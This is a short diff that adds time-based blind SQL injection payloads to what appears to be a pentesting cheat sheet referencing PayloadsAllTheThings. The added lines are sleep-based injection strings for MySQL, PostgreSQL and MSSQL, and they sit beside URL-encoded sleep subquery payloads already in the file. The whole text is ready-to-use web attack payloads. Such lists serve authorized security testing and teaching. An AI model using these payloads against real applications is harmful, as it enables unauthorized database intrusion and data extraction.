@@ -5,6 +5,21 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 ```
 
 ```
+MySQL (string concat and logical ops)
+1' + sleep(10)
+1' and sleep(10)
+1' && sleep(10)
+1' | sleep(10)
+
+PostgreSQL (only support string concat)
+1' || pg_sleep(10)
+
+MSQL
+1' WAITFOR DELAY '0:0:10'
+```
+
+
+```
 %2c(select%20*%20from%20(select(sleep(10)))a)
 %2c(select*from(select(sleep(20)))a)
 (SELECT * FROM (SELECT(SLEEP(15)))a)
